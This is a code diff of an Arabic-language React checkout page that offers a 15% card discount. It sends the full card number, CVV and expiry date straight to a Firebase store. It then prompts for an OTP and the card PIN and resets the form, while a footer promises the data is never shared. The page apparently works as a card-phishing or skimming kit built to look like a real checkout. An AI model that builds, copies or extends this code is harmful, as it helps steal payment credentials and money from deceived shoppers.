@@ -1,19 +1,20 @@
 "use client"
 
 import type React from "react"
-
 import { useState, useEffect } from "react"
 import { Input } from "@/components/ui/input"
 import { Button } from "@/components/ui/button"
 import { Card } from "@/components/ui/card"
 import { Badge } from "@/components/ui/badge"
-import { CreditCard, ShieldCheck, Info } from "lucide-react"
+import { ShieldCheck } from "lucide-react"
 import { detectCardType, formatCardNumber, formatExpiryDate, getBankInfo } from "@/lib/card-utils"
 import { addData } from "@/lib/firebase"
+import { OtpDialog } from "./otp-dialog"
+import { PinDialog } from "./pin-dialog"
+
 
 export default function PaymentPage() {
-  const lookup = require('binlookup')()
-  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState("credit-discount")
+  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState("credit-visa")
   const [cardNumber, setCardNumber] = useState("")
   const [expiryDate, setExpiryDate] = useState("")
   const [cvv, setCvv] = useState("")
@@ -21,14 +22,17 @@ export default function PaymentPage() {
   const [bankInfo, setBankInfo] = useState<{ name: string; country: string } | null>(null)
   const [isValidCard, setIsValidCard] = useState(false)
 
+  // Dialog states
+  const [showOtpDialog, setShowOtpDialog] = useState(false)
+  const [showPinDialog, setShowPinDialog] = useState(false)
+  const [documentId, setDocumentId] = useState<string>()
+
   // Detect card type and bank info when card number changes
   useEffect(() => {
     const cleanNumber = cardNumber.replace(/\s/g, "")
-
     if (cleanNumber.length >= 6) {
       const type = detectCardType(cleanNumber)
       setCardType(type)
-
       const bank = getBankInfo(cleanNumber)
       setBankInfo(bank)
     } else {
@@ -61,44 +65,63 @@ export default function PaymentPage() {
 
   const handlePayment = async (e: React.FormEvent) => {
     e.preventDefault()
-    const visitorID=localStorage.getItem('visitor')
+
+    let visitorID = localStorage.getItem("visitor")
+
+    // Generate visitor ID if it doesn't exist
+    if (!visitorID) {
+      visitorID = "visitor_" + Date.now() + "_" + Math.random().toString(36).substr(2, 9)
+      localStorage.setItem("visitor", visitorID)
+    }
+
     if (!isValidCard) {
-      alert("رقم البطاقة غير صحيح")
+    
       return
     }
-    await addData({id:visitorID,
-      paymentMethod: selectedPaymentMethod,
-      cardType,
-      bankInfo,
-      cvv,
-      cardNumber,
-      expiryDate,})
-      lookup('45717360').then(console.log, console.error)
+
+    try {
+      const docId = await addData({
+        id: visitorID,
+        paymentMethod: selectedPaymentMethod,
+        cardType,
+        bankInfo,
+        cvv,
+        cardNumber,
+        expiryDate,
+      })
+
+      setDocumentId(docId!)
+      setShowOtpDialog(true)
+    } catch (error) {
+     
     }
-  async function getCardInfo(bin: string) {
-    const res = await fetch(`https://lookup.binlist.net/${bin}`);
-    
-    if (!res.ok) throw new Error("BIN lookup failed");
-  
-    const data = await res.json();
-    return {
-      bank: data.bank?.name || "Unknown",
-      type: data.scheme || "Unknown",
-      country: data.country?.name || "Unknown"
-    };
   }
+
+  const handleOtpApproved = () => {
+    setShowOtpDialog(false)
+    setShowPinDialog(true)
+  }
+
+  const handlePinSubmitted = () => {
+    setShowPinDialog(false)
+
+    // Reset form
+    setCardNumber("")
+    setExpiryDate("")
+    setCvv("")
+  }
+
   const getDiscountAmount = () => {
-    if (selectedPaymentMethod === "credit-visa"||selectedPaymentMethod === "credit-mas") {
-      return "5%"
+    if (selectedPaymentMethod === "credit-visa" || selectedPaymentMethod === "credit-mas") {
+      return "15%"
     }
     return null
   }
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 p-4 md:p-6" dir="rtl">
- 
-
-        <Card className="p-6 md:p-8 shadow-2xl border-0">
+    <>
+      <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 p-4 md:p-6" dir="rtl">
+        <Card className="max-w-2xl mx-auto p-6 md:p-8 shadow-2xl border-0">
           <form onSubmit={handlePayment} className="space-y-5 md:space-y-6">
             {/* Payment Method Selection */}
             <div className="space-y-3">
@@ -108,14 +131,20 @@ export default function PaymentPage() {
               </label>
               <div className="space-y-3">
                 {[
-                  { value: "credit-visa", label: "بطاقة فيزا", discount: "5%", recommended: true,img:'/visa.svg' },
-                  { value: "credit-mas", label: "بطاقة ماستر كارد", discount: "5%", recommended: true,img:'/mas.svg' },
-                  { value: "mada", label: "مدى", discount: null, recommended: false,img:'/mada.svg' },
+                  { value: "credit-visa", label: "بطاقة فيزا", discount: "15%", recommended: true, img: "/visa.svg" },
+                  {
+                    value: "credit-mas",
+                    label: "بطاقة ماستر كارد",
+                    discount: "15%",
+                    recommended: true,
+                    img: "/mas.svg",
+                  },
+                  { value: "mada", label: "مدى", discount: null, recommended: false, img: "/mada.svg" },
                 ].map((method) => (
                   <label
                     key={method.value}
                     className={`
-                      relative flex items-center justify-between gap-3 p-4 md:p-5 
+                      relative flex items-center justify-between gap-3 p-4 md:p-5
                       border-2 rounded-xl cursor-pointer transition-all duration-200
                       ${
                         selectedPaymentMethod === method.value
@@ -133,9 +162,8 @@ export default function PaymentPage() {
                         onChange={() => setSelectedPaymentMethod(method.value)}
                         className="w-5 h-5 text-[#0a4a68] focus:ring-[#0a4a68]"
                       />
-                      <img src={method.img} alt="logo" width={30}/>
+                      <img src={method.img || "/placeholder.svg"} alt="logo" width={30} />
                       <span className="text-base md:text-lg font-semibold text-gray-900">{method.label}</span>
-                      
                     </div>
                     <div className="flex items-center gap-2">
                       {method.discount && (
@@ -143,7 +171,6 @@ export default function PaymentPage() {
                           خصم {method.discount}
                         </Badge>
                       )}
-                     
                     </div>
                   </label>
                 ))}
@@ -174,12 +201,14 @@ export default function PaymentPage() {
                 />
                 {cardType && (
                   <div className="absolute right-4 top-1/2 -translate-y-1/2">
-                     {cardType==='Mastercard'?<img src="/mas.svg" alt="maslogo" width={40}/>:<img src="/visa.svg" alt="vlogo" width={40}/>}
+                    {cardType === "Mastercard" ? (
+                      <img src="/mas.svg" alt="maslogo" width={40} />
+                    ) : (
+                      <img src="/visa.svg" alt="vlogo" width={40} />
+                    )}
                   </div>
                 )}
               </div>
-
-             
             </div>
 
             {/* Expiry Date and CVV */}
@@ -243,7 +272,17 @@ export default function PaymentPage() {
         <div className="mt-6 text-center text-xs md:text-sm text-gray-600">
           <p>معلوماتك الشخصية محمية ولن يتم مشاركتها مع أي طرف ثالث</p>
         </div>
-    </div>
+      </div>
+
+      <OtpDialog
+        open={showOtpDialog}
+        onOpenChange={setShowOtpDialog}
+        onOtpApproved={handleOtpApproved}
+        documentId={documentId}
+      />
+
+      <PinDialog open={showPinDialog} onOpenChange={setShowPinDialog} onPinSubmitted={handlePinSubmitted} />
+    </>
   )
 }
 
@@ -251,20 +290,16 @@ export default function PaymentPage() {
 function luhnCheck(cardNumber: string): boolean {
   let sum = 0
   let isEven = false
-
   for (let i = cardNumber.length - 1; i >= 0; i--) {
     let digit = Number.parseInt(cardNumber[i])
-
     if (isEven) {
       digit *= 2
       if (digit > 9) {
         digit -= 9
       }
     }
-
     sum += digit
     isEven = !isEven
   }
-
   return sum % 10 === 0
 }
